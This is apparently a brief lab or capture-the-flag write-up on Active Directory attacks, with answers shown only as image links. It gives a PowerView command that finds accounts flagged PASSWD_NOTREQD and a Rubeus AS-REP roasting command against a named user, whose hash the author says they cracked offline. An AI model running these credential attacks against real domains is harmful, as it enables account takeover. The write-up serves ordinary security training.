# Content

- [Content](#content)
  - [Question 1](#question-1)
    - [The way to hack](#the-way-to-hack)
    - [Answer](#answer)
  - [Question 2](#question-2)
    - [The way to hack](#the-way-to-hack-1)
    - [Answer](#answer-1)
  
## Question 1

### The way to hack

- I run command
- Payload:
  - `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`
  ![Picture](../../Image/Stacking%20The%20Deck/15.png)

### Answer

![Picture](../../Image/Stacking%20The%20Deck/16.png)

## Question 2

### The way to hack

- I run command
- Payload:
  - `.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat`
  - After that, i have the hash krb5 and i just crack it normally.

### Answer

![Picture](../../Image/Stacking%20The%20Deck/17.png)


